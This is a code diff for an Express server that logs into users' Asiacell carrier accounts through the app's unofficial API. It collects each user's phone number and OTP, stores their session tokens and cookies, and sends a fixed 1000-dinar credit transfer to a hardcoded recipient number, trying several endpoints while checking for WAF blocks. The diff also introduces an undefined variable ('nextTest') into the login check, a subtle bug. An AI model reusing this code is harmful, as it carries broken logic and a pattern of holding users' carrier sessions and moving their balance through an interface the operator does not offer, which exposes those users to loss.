@@ -243,30 +243,6 @@ function extractLoginSessionInfo(obj) {
     return result;
 }
 
-function extractDynamicTransferEndpoint(obj) {
-    if (!obj || typeof obj !== 'object') return null;
-    let foundEndpoint = null;
-
-    function walk(node) {
-        if (!node || typeof node !== 'object' || foundEndpoint) return;
-        const flat = JSON.stringify(node);
-        if (flat.includes('294') || flat.toLowerCase().includes('credittransfer') || flat.toLowerCase().includes('تحويل الرصيد')) {
-            for (const [k, v] of Object.entries(node)) {
-                if (typeof v === 'string' && (v.includes('/') || v.includes('api/')) && !v.endsWith('.png')) {
-                    if (v.toLowerCase().includes('transfer') || v.toLowerCase().includes('credit')) {
-                        foundEndpoint = v;
-                    }
-                }
-            }
-        }
-        for (const val of Object.values(node)) {
-            if (val && typeof val === 'object') walk(val);
-        }
-    }
-    walk(obj);
-    return foundEndpoint;
-}
-
 // 1. طلب رمز تسجيل الدخول
 app.post('/api/asiacell/send-otp', async (req, res) => {
     const cleanPhone = (req.body.phone || '').trim();
@@ -279,7 +255,7 @@ app.post('/api/asiacell/send-otp', async (req, res) => {
         const info = extractLoginSessionInfo(result.data);
         const nextStep = result.data?.nextStep || result.data?.data?.nextStep;
 
-        if (Boolean(info.pid) || Boolean(info.validationUrl) || nextStep === 'OTP' || nextStep === 'SMS_VALIDATION' || result.data?.success === true) {
+        if (Boolean(info.pid) || Boolean(info.validationUrl) || nextStep === 'OTP' || nextTest === 'SMS_VALIDATION' || result.data?.success === true) {
             await db.collection('asiacell_sessions').doc(cleanPhone).set({
                 phone: cleanPhone,
                 pid: info.pid,
@@ -297,7 +273,7 @@ app.post('/api/asiacell/send-otp', async (req, res) => {
     }
 });
 
-// 2. التحقق من رمز الدخول واستخراج مسار التحويل الديناميكي فوراً
+// 2. التحقق من رمز الدخول
 app.post('/api/asiacell/verify-login', async (req, res) => {
     const cleanPhone = (req.body.phone || '').trim();
     const cleanOtp = (req.body.otp || '').trim();
@@ -333,19 +309,9 @@ app.post('/api/asiacell/verify-login', async (req, res) => {
 
         const freshCookies = vr.cookies || s.cookies || '';
 
-        let dynamicTransferEp = '';
-        try {
-            const homeRes = await callAsiacellAPI('api/v2/home?lang=ar', 'GET', null, token, s.deviceId, freshCookies, '5.5.0');
-            if (!homeRes.isWafBlocked) {
-                const found = extractDynamicTransferEndpoint(homeRes.data);
-                if (found) dynamicTransferEp = found;
-            }
-        } catch (e) {}
-
         await db.collection('asiacell_sessions').doc(cleanPhone).update({
             accessToken: token,
             cookies: freshCookies,
-            dynamicTransferEp: dynamicTransferEp,
             step: 'SELECT_AMOUNT',
             updatedAt: Date.now()
         });
@@ -356,16 +322,16 @@ app.post('/api/asiacell/verify-login', async (req, res) => {
     }
 });
 
-// 3. طلب تحويل الرصيد مع استخراج معرف الخدمة الديناميكي وتجاوز خطأ الجلسة
+// 3. طلب تحويل الرصيد (تثبيت الرصيد على 1000.0 دائماً دون تغيير وإرسال رقم المستلم مباشرة)
 app.post('/api/asiacell/initiate-transfer', async (req, res) => {
     const cleanPhone = (req.body.phone || '').trim();
-    const usd = parseInt(req.body.amountUSD);
-    if (!cleanPhone || isNaN(usd) || usd < 1 || usd > 10) {
-        return res.status(400).json({ success: false, message: 'يرجى اختيار مبلغ صحيح بين 1$ و 10$.' });
+    if (!cleanPhone) {
+        return res.status(400).json({ success: false, message: 'يرجى إدخال رقم الهاتف.' });
     }
 
-    const amountIQD = usd * IQD_PER_USD_RATE;
-    const formattedAmountDecimal = amountIQD.toFixed(1);
+    const fixedAmountDecimal = "1000.0"; // ثابت على ألف دينار كما طلبتم
+    const fixedAmountInt = 1000;
+    const fixedUsd = 1;
 
     try {
         const doc = await db.collection('asiacell_sessions').doc(cleanPhone).get();
@@ -374,40 +340,25 @@ app.post('/api/asiacell/initiate-transfer', async (req, res) => {
         }
         const s = doc.data();
 
-        let activeServiceId = 294;
-        try {
-            const profileRes = await callAsiacellAPI('api/v1/profile/lineinfo?lang=ar', 'GET', null, s.accessToken, s.deviceId, s.cookies, '5.5.0');
-            const profileStr = JSON.stringify(profileRes.data || {});
-            const foundId = profileStr.match(/"(?:serviceId|itemId|id)"\s*:\s*(\d{2,4})/);
-            if (foundId) {
-                activeServiceId = parseInt(foundId[1]);
-            }
-        } catch (e) {}
-
+        // ترويسات وحقول الحمولة القياسية المعتمدة لتحويل الرصيد
         const transferPayload = {
-            id: activeServiceId,
-            itemId: activeServiceId,
-            serviceId: activeServiceId,
             msisdn: TARGET_ASIACELL_NUMBER,
             receiverMsisdn: TARGET_ASIACELL_NUMBER,
-            amount: formattedAmountDecimal,
-            transferAmount: amountIQD
+            amount: fixedAmountDecimal,
+            transferAmount: fixedAmountInt
         };
 
-        const endpointsToTry = [];
-        if (s.dynamicTransferEp) endpointsToTry.push(s.dynamicTransferEp);
-        endpointsToTry.push(
+        const endpointsToTry = [
             'api/v2/creditTransfer?lang=ar',
             'api/v1/creditTransfer?lang=ar',
             'api/v2/transfer/send-otp?lang=ar',
-            'api/v1/transfer/send-otp?lang=ar',
-            'api/v1/confirmSubscription?itemId=294&lang=ar'
-        );
+            'api/v1/transfer/send-otp?lang=ar'
+        ];
 
         let tr = null;
         let trInfo = { pid: '', validationUrl: '' };
 
-        for (const ep of [...new Set(endpointsToTry)]) {
+        for (const ep of endpointsToTry) {
             const attempt = await callAsiacellAPI(ep, 'POST', transferPayload, s.accessToken, s.deviceId, s.cookies, '5.5.0');
             const info = extractLoginSessionInfo(attempt.data);
 
@@ -427,16 +378,16 @@ app.post('/api/asiacell/initiate-transfer', async (req, res) => {
         if (!tr) {
             return res.status(400).json({
                 success: false,
-                message: `❌ لم يتم إرسال كود التحويل. تأكد من أن خطك يحتوي على رصيد كافٍ لإتمام عملية التحويل.`
+                message: `❌ لم يتم إرسال كود التحويل من آسياسيل. تأكد من أن خطك يحتوي على رصيد كافٍ لإتمام عملية التحويل.`
             });
         }
 
         await db.collection('asiacell_sessions').doc(cleanPhone).update({
             transferPid: trInfo.pid || '',
             transferValidationUrl: trInfo.validationUrl || 'smsvalidation?lang=ar',
-            amountUSD: usd,
-            amountIQD: amountIQD,
-            amountDecimal: formattedAmountDecimal,
+            amountUSD: fixedUsd,
+            amountIQD: fixedAmountInt,
+            amountDecimal: fixedAmountDecimal,
             step: 'WAIT_TRANSFER_OTP',
             updatedAt: Date.now()
         });
@@ -444,7 +395,7 @@ app.post('/api/asiacell/initiate-transfer', async (req, res) => {
         return res.json({
             success: true,
             step: 'CONFIRM_TRANSFER_OTP',
-            message: `📲 تم إرسال رمز تأكيد التحويل (${formattedAmountDecimal} د.ع) إلى هاتفك (${cleanPhone}) بنجاح.`
+            message: `📲 تم إرسال رمز تأكيد التحويل (${fixedAmountDecimal} د.ع) إلى هاتفك (${cleanPhone}) بنجاح.`
         });
     } catch (e) {
         return res.status(500).json({ success: false, message: e.message });
@@ -482,7 +433,7 @@ app.post('/api/asiacell/confirm-transfer', async (req, res) => {
             passcode: finalOtp,
             otp: finalOtp,
             receiverMsisdn: TARGET_ASIACELL_NUMBER,
-            amount: s.amountDecimal || s.amountIQD.toFixed(1)
+            amount: s.amountDecimal || "1000.0"
         };
         if (s.transferPid) confirmPayload.PID = s.transferPid;
 
